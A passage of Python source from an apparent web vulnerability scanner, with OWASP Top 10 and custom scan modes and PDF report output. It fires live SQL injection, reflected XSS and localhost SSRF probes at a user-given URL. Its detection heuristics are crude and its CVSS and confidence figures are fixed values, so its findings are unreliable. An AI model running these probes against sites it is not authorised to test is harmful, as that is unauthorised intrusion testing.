            for cwe_id, cwe_name, _ in high_cwes:
                print(f"  • {cwe_id}: {cwe_name}")
            print()
        
        if medium_cwes:
            print(f"{Colors.WARNING}[MEDIUM CWES]{Colors.ENDC}")
            for cwe_id, cwe_name, _ in medium_cwes:
                print(f"  • {cwe_id}: {cwe_name}")
            print()
        
        view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
        
        if view == 'y':
            display_vulnerabilities(target, scan_id, vulnerabilities)
    else:
        print(f"{Colors.OKGREEN}✓ No SANS Top 25 vulnerabilities detected{Colors.ENDC}\n")
    
    update_stats('LeetScanner - SANS Top 25', target, vuln_found=(len(findings) > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_owasp_top10():
    """OWASP Top 10 vulnerabilities scanner"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.OKGREEN}{Colors.BOLD}[OWASP TOP 10 MODE]{Colors.ENDC}\n")
    print(f"{Colors.OKBLUE}Scanning for OWASP Top 10 2021 Web Application Security Risks{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"\n{Colors.GRAY}[INITIATING OWASP TOP 10 SCAN]...{Colors.ENDC}\n")
    
    loading_animation("Loading OWASP Top 10 2021", duration=2, style="dots")
    
    # OWASP Top 10 2021
    owasp_top10 = [
        ('A01:2021', 'Broken Access Control', 'Authorization bypass testing'),
        ('A02:2021', 'Cryptographic Failures', 'Encryption & data protection check'),
        ('A03:2021', 'Injection', 'SQL, NoSQL, OS command injection'),
        ('A04:2021', 'Insecure Design', 'Design flaw detection'),
        ('A05:2021', 'Security Misconfiguration', 'Configuration review'),
        ('A06:2021', 'Vulnerable Components', 'Outdated software detection'),
        ('A07:2021', 'Authentication Failures', 'Auth mechanism testing'),
        ('A08:2021', 'Software and Data Integrity', 'CI/CD pipeline security'),
        ('A09:2021', 'Logging & Monitoring Failures', 'Security logging check'),
        ('A10:2021', 'SSRF', 'Server-side request forgery'),
    ]
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    total_checks = len(owasp_top10)
    current_check = 0
    
    print(f"\n{Colors.WARNING}⏳ Running {total_checks} OWASP Top 10 checks...{Colors.ENDC}\n")
    
    findings = []
    
    for owasp_id, risk_name, test_desc in owasp_top10:
        current_check += 1
        progress_bar(current_check, total_checks, prefix='OWASP Scan', suffix=f'{risk_name[:25]}')
        
        # A01: Broken Access Control
        if owasp_id == 'A01:2021':
            try:
                test_paths = ['/admin', '/user/profile/1', '/api/users/1']
                
                for path in test_paths:
                    test_url = target.rstrip('/') + path
                    req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urlopen(req, timeout=5)
                    
                    if response.getcode() == 200:
                        content = response.read().decode('utf-8', errors='ignore').lower()
                        if 'login' not in content and 'password' not in content:
                            findings.append((owasp_id, risk_name, 'high'))
                            vulnerabilities['high'].append({
                                'name': f'{owasp_id}: {risk_name}',
                                'cvss': '8.2',
                                'confidence': '85%',
                                'cve': 'OWASP-A01',
                                'description': f'Access control bypass detected at {path}',
                                'impact': 'OWASP #1 Risk - Unauthorized access to sensitive functions.',
                                'remediation': 'Implement proper authorization checks on all resources.'
                            })
                            break
            except:
                pass
        
        # A02: Cryptographic Failures
        elif owasp_id == 'A02:2021':
            try:
                parsed = urlparse(target)
                
                # Check HTTPS
                if parsed.scheme == 'http':
                    findings.append((owasp_id, risk_name, 'medium'))
                    vulnerabilities['medium'].append({
                        'name': f'{owasp_id}: {risk_name}',
                        'cvss': '7.4',
                        'confidence': '100%',
                        'cve': 'OWASP-A02',
                        'description': 'Website not using HTTPS encryption',
                        'impact': 'Data transmitted in plaintext. Man-in-the-middle attacks possible.',
                        'remediation': 'Enable HTTPS with valid SSL/TLS certificate.'
                    })
                
                # Check for weak ciphers
                if parsed.scheme == 'https':
                    req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
                    response = urlopen(req, timeout=5)
                    
                    # Check security headers
                    headers = dict(response.headers)
                    if 'Strict-Transport-Security' not in headers:
                        findings.append((owasp_id, risk_name, 'medium'))
                        vulnerabilities['medium'].append({
                            'name': f'{owasp_id}: HSTS Not Enabled',
                            'cvss': '5.9',
                            'confidence': '100%',
                            'cve': 'OWASP-A02',
                            'description': 'HTTP Strict Transport Security (HSTS) not configured',
                            'impact': 'Protocol downgrade attacks possible.',
                            'remediation': 'Enable HSTS header with long max-age.'
                        })
            except:
                pass
        
        # A03: Injection
        elif owasp_id == 'A03:2021':
            try:
                # Quick SQLi check
                test_url = f"{target}?id=1'"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                if any(err in content for err in ['sql', 'mysql', 'syntax error']):
                    findings.append((owasp_id, risk_name, 'critical'))
                    vulnerabilities['critical'].append({
                        'name': f'{owasp_id}: {risk_name} (SQL Injection)',
                        'cvss': '9.8',
                        'confidence': '90%',
                        'cve': 'OWASP-A03',
                        'description': 'SQL injection vulnerability detected',
                        'impact': 'OWASP #3 Risk - Complete database compromise possible.',
                        'remediation': 'Use parameterized queries and input validation.'
                    })
            except:
                pass
        
        # A05: Security Misconfiguration
        elif owasp_id == 'A05:2021':
            try:
                req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                headers = dict(response.headers)
                
                missing_headers = []
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection',
                    'X-Content-Type-Options': 'MIME sniffing protection',
                    'Content-Security-Policy': 'XSS protection',
                    'X-XSS-Protection': 'XSS filter'
                }
                
                for header, desc in security_headers.items():
                    if header not in headers:
                        missing_headers.append((header, desc))
                
                if missing_headers:
                    findings.append((owasp_id, risk_name, 'medium'))
                    headers_list = ', '.join([h[0] for h in missing_headers[:3]])
                    vulnerabilities['medium'].append({
                        'name': f'{owasp_id}: {risk_name}',
                        'cvss': '6.5',
                        'confidence': '100%',
                        'cve': 'OWASP-A05',
                        'description': f'Missing security headers: {headers_list}',
                        'impact': 'Increased attack surface. Multiple attack vectors available.',
                        'remediation': 'Configure all recommended security headers.'
                    })
                
                # Check for server info disclosure
                if 'Server' in headers or 'X-Powered-By' in headers:
                    findings.append((owasp_id, f'{risk_name} (Info Disclosure)', 'low'))
                    vulnerabilities['low'].append({
                        'name': f'{owasp_id}: Information Disclosure',
                        'cvss': '3.7',
                        'confidence': '100%',
                        'cve': 'OWASP-A05',
                        'description': 'Server version information exposed in headers',
                        'impact': 'Assists attackers in identifying vulnerabilities.',
                        'remediation': 'Remove or obfuscate server version headers.'
                    })
            except:
                pass
        
        # A06: Vulnerable Components
        elif owasp_id == 'A06:2021':
            try:
                req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                # Check for jQuery version
                jquery_match = re.search(r'jquery[/-](\d+\.\d+\.\d+)', content, re.IGNORECASE)
                if jquery_match:
                    version = jquery_match.group(1)
                    major_version = int(version.split('.')[0])
                    
                    if major_version < 3:
                        findings.append((owasp_id, risk_name, 'medium'))
                        vulnerabilities['medium'].append({
                            'name': f'{owasp_id}: {risk_name} (jQuery {version})',
                            'cvss': '6.1',
                            'confidence': '100%',
                            'cve': 'OWASP-A06',
                            'description': f'Outdated jQuery version detected: {version}',
                            'impact': 'Known vulnerabilities in old jQuery versions.',
                            'remediation': 'Update jQuery to latest version (3.x or higher).'
                        })
            except:
                pass
        
        # A10: SSRF
        elif owasp_id == 'A10:2021':
            try:
                test_url = f"{target}?url=http://localhost"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'localhost' in content or '127.0.0.1' in content:
                    findings.append((owasp_id, risk_name, 'high'))
                    vulnerabilities['high'].append({
                        'name': f'{owasp_id}: {risk_name}',
                        'cvss': '8.6',
                        'confidence': '85%',
                        'cve': 'OWASP-A10',
                        'description': 'Server-Side Request Forgery vulnerability detected',
                        'impact': 'Internal network scanning, cloud metadata access.',
                        'remediation': 'Validate and whitelist all URLs, disable URL redirects.'
                    })
            except:
                pass
        
        time.sleep(0.3)
    
    print()
    
    # Results
    print(f"\n{Colors.OKGREEN}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}OWASP TOP 10 SCAN RESULTS{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.WHITE}Checks Performed:{Colors.ENDC} {total_checks}")
    print(f"{Colors.WARNING}Risks Detected:{Colors.ENDC} {len(findings)}\n")
    
    if findings:
        print(f"{Colors.FAIL}⚠️  OWASP TOP 10 RISKS FOUND!{Colors.ENDC}\n")
        
        for owasp_id, risk_name, severity in findings:
            severity_colors = {
                'critical': Colors.FAIL,
                'high': Colors.FAIL,
                'medium': Colors.WARNING,
                'low': Colors.OKGREEN
            }
            color = severity_colors.get(severity, Colors.WHITE)
            print(f"{color}[{severity.upper()}] {owasp_id}: {risk_name}{Colors.ENDC}")
        
        print()
        
        view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
        
        if view == 'y':
            display_vulnerabilities(target, scan_id, vulnerabilities)
    else:
        print(f"{Colors.OKGREEN}✓ No OWASP Top 10 risks detected{Colors.ENDC}\n")
    
    update_stats('LeetScanner - OWASP Top 10', target, vuln_found=(len(findings) > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")

def leetscanner_custom_scan():
    """Custom vulnerability selection"""
    clear_screen()
    print_banner()
    print(f"\n{Colors.OKCYAN}{Colors.BOLD}[CUSTOM SCAN MODE]{Colors.ENDC}\n")
    print(f"{Colors.WHITE}Select specific vulnerability types to scan{Colors.ENDC}\n")
    
    target = input(f"{Colors.OKCYAN}[?] Enter target URL: {Colors.ENDC}").strip()
    
    if not target:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Vulnerability categories
    print(f"\n{Colors.OKBLUE}[SELECT VULNERABILITY TYPES]{Colors.ENDC}\n")
    
    vuln_types = {
        '1': ('SQL Injection', 'sqli'),
        '2': ('Cross-Site Scripting (XSS)', 'xss'),
        '3': ('Path Traversal', 'path_traversal'),
        '4': ('Command Injection', 'command_injection'),
        '5': ('File Upload', 'file_upload'),
        '6': ('SSRF', 'ssrf'),
        '7': ('XXE', 'xxe'),
        '8': ('CSRF', 'csrf'),
        '9': ('Authentication Bypass', 'auth_bypass'),
        '10': ('Information Disclosure', 'info_disclosure'),
        '11': ('Security Headers', 'headers'),
        '12': ('Sensitive Files', 'sensitive_files'),
    }
    
    for key, (name, _) in vuln_types.items():
        print(f"  [{key}] {name}")
    
    print(f"\n{Colors.GRAY}Enter numbers separated by commas (e.g., 1,2,3){Colors.ENDC}")
    print(f"{Colors.GRAY}Or type 'all' to select all types{Colors.ENDC}\n")
    
    selection = input(f"{Colors.WARNING}[?] Your selection: {Colors.ENDC}").strip().lower()
    
    if selection == 'all':
        selected_types = list(vuln_types.values())
    else:
        selected_keys = [k.strip() for k in selection.split(',')]
        selected_types = [vuln_types[k] for k in selected_keys if k in vuln_types]
    
    if not selected_types:
        print_error("No valid selection!")
        time.sleep(2)
        return
    
    import uuid
    scan_id = str(uuid.uuid4())
    
    print(f"\n{Colors.OKGREEN}✓ URL:{Colors.ENDC} {target}")
    print(f"{Colors.WHITE}Selected:{Colors.ENDC} {len(selected_types)} vulnerability type(s)\n")
    
    loading_animation("Preparing custom scan", duration=1.5, style="braille")
    
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': [],
        'info': []
    }
    
    total_tests = len(selected_types)
    current_test = 0
    
    print(f"\n{Colors.WARNING}⏳ Running custom scan...{Colors.ENDC}\n")
    
    for vuln_name, vuln_type in selected_types:
        current_test += 1
        progress_bar(current_test, total_tests, prefix='Custom Scan', suffix=vuln_name[:25])
        
        # Perform specific tests based on type
        if vuln_type == 'sqli':
            # Quick SQLi test
            try:
                test_url = f"{target}?id=1'"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                if 'sql' in content or 'mysql' in content:
                    vulnerabilities['critical'].append({
                        'name': 'SQL Injection Vulnerability',
                        'cvss': '9.8',
                        'confidence': '90%',
                        'cve': 'CWE-89',
                        'description': 'SQL injection detected',
                        'impact': 'Database compromise possible',
                        'remediation': 'Use parameterized queries'
                    })
            except:
                pass
        
        elif vuln_type == 'xss':
            # Quick XSS test
            try:
                test_url = f"{target}?q=<script>alert(1)</script>"
                req = Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if '<script>alert(1)</script>' in content:
                    vulnerabilities['high'].append({
                        'name': 'Cross-Site Scripting (XSS)',
                        'cvss': '7.1',
                        'confidence': '90%',
                        'cve': 'CWE-79',
                        'description': 'Reflected XSS vulnerability',
                        'impact': 'Script execution in victim browser',
                        'remediation': 'Implement output encoding'
                    })
            except:
                pass
        
        elif vuln_type == 'headers':
            # Security headers check
            try:
                req = Request(target, headers={'User-Agent': 'Mozilla/5.0'})
                response = urlopen(req, timeout=5)
                headers = dict(response.headers)
                
                missing = []
                for header in ['X-Frame-Options', 'X-Content-Type-Options', 'Content-Security-Policy']:
                    if header not in headers:
                        missing.append(header)
                
                if missing:
                    vulnerabilities['medium'].append({
                        'name': 'Missing Security Headers',
                        'cvss': '5.3',
                        'confidence': '100%',
                        'cve': 'CWE-693',
                        'description': f'Missing: {", ".join(missing)}',
                        'impact': 'Increased attack surface',
                        'remediation': 'Configure security headers'
                    })
            except:
                pass
        
        time.sleep(0.3)
    
    print()
    
    # Results
    total_vulns = sum(len(v) for v in vulnerabilities.values())
    
    print(f"\n{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}CUSTOM SCAN RESULTS{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}\n")
    
    print(f"{Colors.WHITE}Tests Performed:{Colors.ENDC} {total_tests}")
    print(f"{Colors.WARNING}Vulnerabilities Found:{Colors.ENDC} {total_vulns}\n")
    
    if total_vulns > 0:
        print(f"{Colors.FAIL}💥 CRITICAL: {len(vulnerabilities['critical'])}{Colors.ENDC}")
        print(f"{Colors.FAIL}🔴 HIGH: {len(vulnerabilities['high'])}{Colors.ENDC}")
        print(f"{Colors.WARNING}🟡 MEDIUM: {len(vulnerabilities['medium'])}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}🟢 LOW: {len(vulnerabilities['low'])}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}ℹ️  INFO: {len(vulnerabilities['info'])}{Colors.ENDC}\n")
        
        view = input(f"{Colors.WARNING}[?] View detailed findings? (y/n): {Colors.ENDC}").strip().lower()
        
        if view == 'y':
            display_vulnerabilities(target, scan_id, vulnerabilities)
    else:
        print(f"{Colors.OKGREEN}✓ No vulnerabilities detected in selected categories{Colors.ENDC}\n")
    
    update_stats('LeetScanner - Custom Scan', target, vuln_found=(total_vulns > 0))
    
    input(f"\n{Colors.OKGREEN}[Press Enter to continue...]{Colors.ENDC}")
    
def generate_vulnerability_graph(vulnerabilities, filename="vuln_graph.png"):
    """Generate vulnerability distribution pie chart"""
    reports_dir = os.path.expanduser("~/drgxel_reports")
    os.makedirs(reports_dir, exist_ok=True)
    
    # Count vulnerabilities by severity
    counts = {
        "CRITICAL": len(vulnerabilities.get('critical', [])),
        "HIGH": len(vulnerabilities.get('high', [])),
        "MEDIUM": len(vulnerabilities.get('medium', [])),
        "LOW": len(vulnerabilities.get('low', [])),
        "INFO": len(vulnerabilities.get('info', []))
    }
    
    # Filter out zero counts
    filtered_counts = {k: v for k, v in counts.items() if v > 0}
    
    if not filtered_counts:
        print_warning("No vulnerabilities to graph")
        return None
    
    try:
        # Try to use matplotlib if available
        import matplotlib
        matplotlib.use('Agg')  # Non-GUI backend
        import matplotlib.pyplot as plt
        
        labels = filtered_counts.keys()
        sizes = filtered_counts.values()
        colors = ['#FF0000', '#FF6600', '#FFCC00', '#00CC00', '#0066CC'][:len(filtered_counts)]
        explode = [0.1 if k == "CRITICAL" else 0 for k in filtered_counts.keys()]
        
        plt.figure(figsize=(8, 6))
        plt.pie(sizes, labels=labels, autopct='%1.1f%%', colors=colors, 
                explode=explode, startangle=140, shadow=True)
        plt.title("Vulnerability Distribution by Severity", fontsize=14, fontweight='bold')
        
        graph_path = os.path.join(reports_dir, filename)
        plt.savefig(graph_path, dpi=150, bbox_inches='tight')
        plt.close()
        
        return graph_path
    
    except ImportError:
        # Matplotlib not available - create ASCII chart instead
        print_info("Matplotlib not installed. Creating text-based chart.")
        return create_ascii_chart(filtered_counts, reports_dir, filename.replace('.png', '.txt'))

def create_ascii_chart(counts, reports_dir, filename):
    """Create ASCII bar chart as fallback"""
    chart_path = os.path.join(reports_dir, filename)
    
    total = sum(counts.values())
    max_bar = 40
    
    with open(chart_path, 'w') as f:
        f.write("VULNERABILITY DISTRIBUTION\n")
        f.write("=" * 50 + "\n\n")
        
        for severity, count in counts.items():
            percentage = (count / total * 100) if total > 0 else 0
            bar_length = int((count / total * max_bar)) if total > 0 else 0
            bar = "█" * bar_length
            
            f.write(f"{severity:10s} [{count:2d}] {bar} {percentage:.1f}%\n")
        
        f.write("\n" + "=" * 50 + "\n")
        f.write(f"Total: {total} vulnerabilities\n")
    
    return chart_path

def generate_pdf_report(target, scan_id, vulnerabilities, scan_mode="FULL SCAN"):
    """Generate comprehensive PDF report"""
    
    if not FPDF_AVAILABLE:
        return generate_text_report(target, scan_id, vulnerabilities, scan_mode)
    
    reports_dir = os.path.expanduser("~/drgxel_reports")
    os.makedirs(reports_dir, exist_ok=True)
    
    # Generate graph first
    print_info("Generating vulnerability distribution graph...")
    graph_file = generate_vulnerability_graph(vulnerabilities)
    
    # Initialize PDF
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    
    # Helper function to clean text for PDF (remove emojis and special chars)
    def clean_text(text):
        """Remove non-latin1 characters for FPDF compatibility"""
        if not text:
            return ""
        # Remove common emojis and special unicode
        text = str(text)
        # Replace common emojis with text equivalents
        replacements = {
            '💥': '[CRITICAL]',
            '🔴': '[HIGH]',
            '🟡': '[MEDIUM]',
            '🟢': '[LOW]',
            'ℹ️': '[INFO]',
            '🎯': '[TARGET]',
            '📄': '[DETAILS]',
            '🔧': '[FIX]',
            '⚠': '[WARNING]',
            '✓': '[OK]',
            '✗': '[ERROR]',
            '→': '->',
            '←': '<-',
            '•': '-',
            '◼': '*',
            '📊': '[CHART]',
            '📁': '[FOLDER]',
        }
        
        for emoji, replacement in replacements.items():
            text = text.replace(emoji, replacement)
        
        # Remove any remaining non-latin1 characters
        try:
            text.encode('latin-1')
            return text
        except UnicodeEncodeError:
            # Remove problematic characters
            return ''.join(char if ord(char) < 256 else '?' for char in text)
    
    pdf.set_font("Arial", "B", 20)
    pdf.set_text_color(128, 0, 128)
    pdf.cell(0, 15, clean_text("DRGXEL CyberPack"), ln=True, align='C')
    
    pdf.set_font("Arial", "B", 16)
    pdf.set_text_color(0, 0, 0)
    pdf.cell(0, 10, clean_text("LeetScanner Security Report"), ln=True, align='C')
    
    pdf.set_font("Arial", "", 10)
    pdf.set_text_color(100, 100, 100)
    pdf.cell(0, 5, clean_text(f"Generated by DRGXEL CyberPack v{VERSION} ({CODENAME})"), ln=True, align='C')
    pdf.cell(0, 5, clean_text(f"Report Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), ln=True, align='C')
    
    pdf.ln(10)

    pdf.set_fill_color(200, 220, 255)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 8, clean_text("Target Information"), ln=True, fill=True, border=1)
    
    pdf.set_font("Arial", "", 10)
    pdf.cell(40, 6, clean_text("Target URL:"), border='LR')
    pdf.set_font("Arial", "B", 10)
    pdf.cell(0, 6, clean_text(target), ln=True, border='R')
    
    pdf.set_font("Arial", "", 10)
    pdf.cell(40, 6, clean_text("Scan Mode:"), border='LR')
    pdf.set_font("Arial", "B", 10)
    pdf.cell(0, 6, clean_text(scan_mode), ln=True, border='R')
    
    pdf.set_font("Arial", "", 10)
    pdf.cell(40, 6, clean_text("Scan ID:"), border='LBR')
    pdf.set_font("Arial", "B", 10)
    pdf.cell(0, 6, clean_text(scan_id), ln=True, border='BR')
    
    pdf.ln(10)

    critical_count = len(vulnerabilities.get('critical', []))
    high_count = len(vulnerabilities.get('high', []))
    medium_count = len(vulnerabilities.get('medium', []))
    low_count = len(vulnerabilities.get('low', []))
    info_count = len(vulnerabilities.get('info', []))
    total_count = critical_count + high_count + medium_count + low_count + info_count
    
    pdf.set_fill_color(255, 200, 200)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 8, clean_text("Executive Summary"), ln=True, fill=True, border=1)
    pdf.ln(3)
    
    # Risk Assessment
    if critical_count > 0 or high_count > 3:
        risk_level = "CRITICAL"
        risk_color = (255, 0, 0)
        risk_desc = "Immediate action required. Critical security vulnerabilities detected that could lead to system compromise."
    elif high_count > 0 or medium_count > 5:
        risk_level = "HIGH"
        risk_color = (255, 100, 0)
        risk_desc = "High priority remediation needed. Multiple significant security issues require attention."
    elif medium_count > 0:
        risk_level = "MEDIUM"
        risk_color = (255, 200, 0)
        risk_desc = "Moderate security concerns present. Remediation recommended to improve security posture."
    else:
        risk_level = "LOW"
        risk_color = (0, 200, 0)
        risk_desc = "Minor security issues detected. Low priority remediation suggested."
    
    pdf.set_font("Arial", "B", 11)
    pdf.cell(50, 6, clean_text("Overall Risk Level:"), 0)
    pdf.set_text_color(*risk_color)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 6, clean_text(risk_level), ln=True)
    pdf.set_text_color(0, 0, 0)
    
    pdf.set_font("Arial", "", 9)
    pdf.multi_cell(0, 5, clean_text(risk_desc))
    pdf.ln(5)
    
    # Vulnerability Statistics Table
    pdf.set_fill_color(240, 240, 240)
    pdf.set_font("Arial", "B", 10)
    pdf.cell(60, 7, clean_text("Severity Level"), 1, 0, 'C', fill=True)
    pdf.cell(40, 7, clean_text("Count"), 1, 0, 'C', fill=True)
    pdf.cell(0, 7, clean_text("Description"), 1, 1, 'C', fill=True)
    
    stats = [
        ("CRITICAL", critical_count, "Immediate threat", (255, 0, 0)),
        ("HIGH", high_count, "Significant risk", (255, 100, 0)),
        ("MEDIUM", medium_count, "Moderate concern", (255, 200, 0)),
        ("LOW", low_count, "Minor issue", (0, 150, 0)),
        ("INFO", info_count, "Informational", (0, 100, 200))
    ]
    
    pdf.set_font("Arial", "", 9)
    for label, count, desc, color in stats:
        if count > 0:
            pdf.set_text_color(*color)
            pdf.set_font("Arial", "B", 9)
            pdf.cell(60, 6, clean_text(label), 1, 0, 'L')
            pdf.cell(40, 6, clean_text(str(count)), 1, 0, 'C')
            pdf.set_font("Arial", "", 9)
            pdf.set_text_color(0, 0, 0)
            pdf.cell(0, 6, clean_text(desc), 1, 1, 'L')
    
    pdf.set_font("Arial", "B", 10)
    pdf.set_fill_color(200, 200, 255)
    pdf.cell(60, 6, clean_text("TOTAL"), 1, 0, 'L', fill=True)
    pdf.cell(40, 6, clean_text(str(total_count)), 1, 0, 'C', fill=True)
    pdf.cell(0, 6, clean_text("Total findings"), 1, 1, 'L', fill=True)
    
    pdf.ln(10)

    if graph_file and os.path.exists(graph_file):
        pdf.set_fill_color(220, 240, 255)
        pdf.set_font("Arial", "B", 12)
        pdf.cell(0, 8, clean_text("Vulnerability Distribution"), ln=True, fill=True, border=1)
        pdf.ln(5)
        
        try:
            if graph_file.endswith('.png'):
                pdf.image(graph_file, x=30, w=150)
            else:
                # ASCII chart
                with open(graph_file, 'r', encoding='utf-8') as f:
                    chart_content = f.read()
                pdf.set_font("Courier", "", 8)
                pdf.multi_cell(0, 4, clean_text(chart_content))
        except Exception as e:
            pdf.set_font("Arial", "I", 9)
            pdf.cell(0, 5, clean_text(f"[Graph generation error: {str(e)[:50]}]"), ln=True, align='C')
        
        pdf.ln(5)
    
    pdf.add_page()
    
    pdf.set_fill_color(255, 220, 200)
    pdf.set_font("Arial", "B", 14)
    pdf.cell(0, 10, clean_text("Detailed Vulnerability Findings"), ln=True, fill=True, border=1)
    pdf.ln(5)
    
    vuln_number = 1
    
    for severity in ['critical', 'high', 'medium', 'low', 'info']:
        vulns = vulnerabilities.get(severity, [])
        
        if not vulns:
            continue
        
        severity_colors_pdf = {
            'critical': (255, 0, 0),
            'high': (255, 100, 0),
            'medium': (255, 200, 0),
            'low': (0, 150, 0),
            'info': (0, 100, 200)
        }
        
        for vuln in vulns:
            # Check page break
            if pdf.get_y() > 250:
                pdf.add_page()
            
            # Vulnerability header
            pdf.set_fill_color(245, 245, 245)
            pdf.set_font("Arial", "B", 11)
            pdf.set_text_color(*severity_colors_pdf[severity])
            
            vuln_name = clean_text(vuln.get('name', 'Unknown Vulnerability'))
            vuln_title = f"#{vuln_number} [{severity.upper()}] {vuln_name}"
            if len(vuln_title) > 80:
                vuln_title = vuln_title[:77] + "..."
            
            pdf.cell(0, 8, vuln_title, ln=True, fill=True, border='LTR')
            pdf.set_text_color(0, 0, 0)
            
            # Details box
            pdf.set_fill_color(255, 255, 255)
            pdf.set_font("Arial", "", 9)
            
            # CVSS
            pdf.cell(30, 5, clean_text("CVSS Score:"), 'LR')
            pdf.set_font("Arial", "B", 9)
            pdf.cell(0, 5, clean_text(vuln.get('cvss', 'N/A')), 'R', ln=True)
            
            # Confidence
            pdf.set_font("Arial", "", 9)
            pdf.cell(30, 5, clean_text("Confidence:"), 'LR')
            pdf.set_font("Arial", "B", 9)
            pdf.cell(0, 5, clean_text(vuln.get('confidence', 'N/A')), 'R', ln=True)
            
            # CVE
            if 'cve' in vuln:
                pdf.set_font("Arial", "", 9)
                pdf.cell(30, 5, clean_text("CVE/CWE:"), 'LR')
                pdf.set_font("Arial", "B", 9)
                pdf.cell(0, 5, clean_text(vuln['cve']), 'R', ln=True)
            
            # Description
            pdf.set_font("Arial", "B", 9)
            pdf.cell(0, 5, clean_text("Description:"), 'LR', ln=True)
            pdf.set_font("Arial", "", 8)
            
            desc = clean_text(vuln.get('description', 'No description available'))
            # Split long text
            words = desc.split()
            line = ""
            for word in words:
                if len(line + word) < 90:
                    line += word + " "
                else:
                    pdf.cell(0, 4, line.strip(), 'LR', ln=True)
                    line = word + " "
            if line:
                pdf.cell(0, 4, line.strip(), 'LR', ln=True)
            
            # Impact
            if 'impact' in vuln:
                pdf.set_font("Arial", "B", 9)
                pdf.cell(0, 5, clean_text("Impact:"), 'LR', ln=True)
                pdf.set_font("Arial", "", 8)
                
                impact = clean_text(vuln['impact'])
                words = impact.split()
                line = ""
                for word in words:
                    if len(line + word) < 90:
                        line += word + " "
                    else:
                        pdf.cell(0, 4, line.strip(), 'LR', ln=True)
                        line = word + " "
                if line:
                    pdf.cell(0, 4, line.strip(), 'LR', ln=True)
            
            # Remediation
            if 'remediation' in vuln:
                pdf.set_font("Arial", "B", 9)
                pdf.cell(0, 5, clean_text("Remediation:"), 'LR', ln=True)
                pdf.set_font("Arial", "", 8)
                
                remediation = clean_text(vuln['remediation'])
                words = remediation.split()
                line = ""
                for word in words:
                    if len(line + word) < 90:
                        line += word + " "
                    else:
                        pdf.cell(0, 4, line.strip(), 'LR', ln=True)
                        line = word + " "
                if line:
                    pdf.cell(0, 4, line.strip(), 'LR', ln=True)
            
            # Close box
            pdf.cell(0, 0, '', 'LBR', ln=True)
            pdf.ln(5)
            vuln_number += 1

    pdf.add_page()
    
    pdf.set_fill_color(200, 255, 200)
    pdf.set_font("Arial", "B", 14)
    pdf.cell(0, 10, clean_text("Security Recommendations"), ln=True, fill=True, border=1)
    pdf.ln(5)
    
    pdf.set_font("Arial", "", 10)
    
    recommendations = [
        "1. Address all CRITICAL and HIGH severity vulnerabilities immediately",
        "2. Implement comprehensive input validation and output encoding",
        "3. Keep all software, frameworks, and dependencies up to date",
        "4. Enable essential security headers (HSTS, CSP, X-Frame-Options, etc.)",
        "5. Implement robust authentication and session management",
        "6. Use HTTPS for all communications with valid SSL/TLS certificates",
        "7. Conduct regular security audits and penetration testing",
        "8. Deploy a Web Application Firewall (WAF) for additional protection",
        "9. Follow OWASP Security Guidelines and best practices",
        "10. Provide security training for development team"
    ]
    
    for rec in recommendations:
        pdf.multi_cell(0, 6, clean_text(rec))
        pdf.ln(1)
    
    pdf.ln(10)
    pdf.set_font("Arial", "I", 8)
    pdf.set_text_color(120, 120, 120)
    footer_text = (
        f"This report was generated by DRGXEL CyberPack v{VERSION} - Professional Security Testing Framework. "
        "The information contained in this report is confidential and intended for authorized personnel only. "
        "For questions or support, visit https://github.com/drgxel/cyberpack"
    )
    pdf.multi_cell(0, 4, clean_text(footer_text))
    
    # Save PDF
    sanitized_target = target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
    filename = f"leetscanner_{sanitized_target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    filepath = os.path.join(reports_dir, filename)
    
    try:
        pdf.output(filepath)
